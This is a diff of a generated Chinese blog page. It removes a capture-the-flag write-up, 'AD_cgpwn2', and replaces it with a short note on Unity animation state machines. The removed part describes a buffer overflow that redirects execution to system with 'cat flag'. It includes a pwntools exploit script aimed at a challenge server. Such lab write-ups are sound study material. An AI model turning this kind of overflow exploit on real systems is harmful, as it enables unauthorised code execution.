@@ -20,32 +20,28 @@
   <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
 
 <script class="next-config" data-name="main" type="application/json">{"hostname":"example.com","root":"/","images":"/images","scheme":"Muse","version":"8.7.1","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":false,"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"}}</script><script src="/js/config.js"></script>
-<meta name="description" content="这题和level2很像，都是溢出覆盖返回地址，进入system函数。（一些其它细节在同level2） 但本题没有提供system函数所需的关键字符串，所以可以在输入其它变量时输入想要的字符串，例如：cat flag。找出这个变量的地址，用p32打包给system函数做参数。  值得一提的是，本题有两个system函数，都可以用。   123456789101112131415#!&#x2F;us">
+<meta name="description" content="选中一个对象，创建一个动画片段，然后引擎会在对象上自动创建一个动画状态机 制作动画 一般会有一个默认动画idle 打开动画器制作不同动画之间的关系 左侧参数中可以增加参数，右侧Transitions中可以增加动画之间的变换，conditions可以让变化联系参数。 右侧参数包括动画之间切换的连贯性 注： Unity animation三角播放按钮灰色，无法点击播放怎么办？ 需要选中角色, 或">
 <meta property="og:type" content="article">
-<meta property="og:title" content="AD_cgpwn2">
-<meta property="og:url" content="http://example.com/2021/03/26/AD-cgpwn2/index.html">
+<meta property="og:title" content="动画">
+<meta property="og:url" content="http://example.com/2022/02/28/%E5%8A%A8%E7%94%BB/index.html">
 <meta property="og:site_name" content="划水骗分二十年，没人比我更懂蒻">
-<meta property="og:description" content="这题和level2很像，都是溢出覆盖返回地址，进入system函数。（一些其它细节在同level2） 但本题没有提供system函数所需的关键字符串，所以可以在输入其它变量时输入想要的字符串，例如：cat flag。找出这个变量的地址，用p32打包给system函数做参数。  值得一提的是，本题有两个system函数，都可以用。   123456789101112131415#!&#x2F;us">
+<meta property="og:description" content="选中一个对象，创建一个动画片段，然后引擎会在对象上自动创建一个动画状态机 制作动画 一般会有一个默认动画idle 打开动画器制作不同动画之间的关系 左侧参数中可以增加参数，右侧Transitions中可以增加动画之间的变换，conditions可以让变化联系参数。 右侧参数包括动画之间切换的连贯性 注： Unity animation三角播放按钮灰色，无法点击播放怎么办？ 需要选中角色, 或">
 <meta property="og:locale" content="en_US">
-<meta property="og:image" content="http://example.com/2021/03/26/AD-cgpwn2/1.png">
-<meta property="og:image" content="http://example.com/2021/03/26/AD-cgpwn2/2.png">
-<meta property="og:image" content="http://example.com/2021/03/26/AD-cgpwn2/3.png">
-<meta property="article:published_time" content="2021-03-26T13:26:04.000Z">
-<meta property="article:modified_time" content="2021-03-26T13:36:14.732Z">
+<meta property="article:published_time" content="2022-02-28T08:27:51.000Z">
+<meta property="article:modified_time" content="2022-02-28T09:00:32.146Z">
 <meta property="article:author" content="甜药补习班吊尾生">
-<meta property="article:tag" content="PWN">
+<meta property="article:tag" content="unity">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="http://example.com/2021/03/26/AD-cgpwn2/1.png">
 
 
-<link rel="canonical" href="http://example.com/2021/03/26/AD-cgpwn2/">
+<link rel="canonical" href="http://example.com/2022/02/28/%E5%8A%A8%E7%94%BB/">
 
 
 
-<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"en","comments":true,"permalink":"http://example.com/2021/03/26/AD-cgpwn2/","path":"2021/03/26/AD-cgpwn2/","title":"AD_cgpwn2"}</script>
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"en","comments":true,"permalink":"http://example.com/2022/02/28/%E5%8A%A8%E7%94%BB/","path":"2022/02/28/动画/","title":"动画"}</script>
 
 <script class="next-config" data-name="calendar" type="application/json">""</script>
-<title>AD_cgpwn2 | 划水骗分二十年，没人比我更懂蒻</title>
+<title>动画 | 划水骗分二十年，没人比我更懂蒻</title>
   
 
 
@@ -171,7 +167,7 @@
   
 
   <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2021/03/26/AD-cgpwn2/">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/02/28/%E5%8A%A8%E7%94%BB/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avatar.gif">
@@ -184,7 +180,7 @@
     </span>
       <header class="post-header">
         <h1 class="post-title" itemprop="name headline">
-          AD_cgpwn2
+          动画
         </h1>
 
         <div class="post-meta-container">
@@ -196,7 +192,7 @@
       <span class="post-meta-item-text">Posted on</span>
       
 
-      <time title="Created: 2021-03-26 21:26:04 / Modified: 21:36:14" itemprop="dateCreated datePublished" datetime="2021-03-26T21:26:04+08:00">2021-03-26</time>
+      <time title="Created: 2022-02-28 16:27:51 / Modified: 17:00:32" itemprop="dateCreated datePublished" datetime="2022-02-28T16:27:51+08:00">2022-02-28</time>
     </span>
 
   
@@ -209,13 +205,10 @@
     
     
     <div class="post-body" itemprop="articleBody">
-        <p>这题和level2很像，都是溢出覆盖返回地址，进入system函数。（一些其它细节在同level2）</p>
-<p>但本题没有提供system函数所需的关键字符串，所以可以在输入其它变量时输入想要的字符串，例如：cat flag。找出这个变量的地址，用p32打包给system函数做参数。</p>
-<img src="/2021/03/26/AD-cgpwn2/1.png" class>
-<p>值得一提的是，本题有两个system函数，都可以用。</p>
-<img src="/2021/03/26/AD-cgpwn2/2.png" class>
-<img src="/2021/03/26/AD-cgpwn2/3.png" class>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * </span><br><span class="line">io = remote(<span class="string">&quot;111.200.241.244&quot;</span>, <span class="number">35786</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&quot;please tell me your name&quot;</span>)</span><br><span class="line">io.sendline(<span class="string">&quot;cat flag&quot;</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&quot;hello,you can leave some message here:\n&quot;</span>)</span><br><span class="line">sys_add = <span class="number">0x08048420</span> <span class="comment"># 0x0804854D也行</span></span><br><span class="line">cmd_add = <span class="number">0x0804A080</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x2A</span> + p32(sys_add) + p32(<span class="number">0</span>) + p32(cmd_add)</span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+        <p>选中一个对象，创建一个动画片段，然后引擎会在对象上自动创建一个动画状态机</p>
+<p>制作动画 一般会有一个默认动画idle</p>
+<p>打开动画器制作不同动画之间的关系 左侧参数中可以增加参数，右侧Transitions中可以增加动画之间的变换，conditions可以让变化联系参数。 右侧参数包括动画之间切换的连贯性</p>
+<p>注： Unity animation三角播放按钮灰色，无法点击播放怎么办？ 需要选中角色, 或者动画所对应的GameObject,才可以点击播放按钮</p>
 
     </div>
 
@@ -225,21 +218,18 @@
 
     <footer class="post-footer">
           <div class="post-tags">
-              <a href="/tags/PWN/" rel="tag"># PWN</a>
+              <a href="/tags/unity/" rel="tag"># unity</a>
           </div>
 
         
 
           <div class="post-nav">
             <div class="post-nav-item">
-                <a href="/2021/03/25/AD-string/" rel="prev" title="AD_string">
-                  <i class="fa fa-chevron-left"></i> AD_string
+                <a href="/2022/02/28/%E7%89%A9%E7%90%86/" rel="prev" title="物理">
+                  <i class="fa fa-chevron-left"></i> 物理
                 </a>
             </div>
             <div class="post-nav-item">
-                <a href="/2021/03/27/AD-level3/" rel="next" title="AD_level3">
-                  AD_level3 <i class="fa fa-chevron-right"></i>
-                </a>
             </div>
           </div>
     </footer>
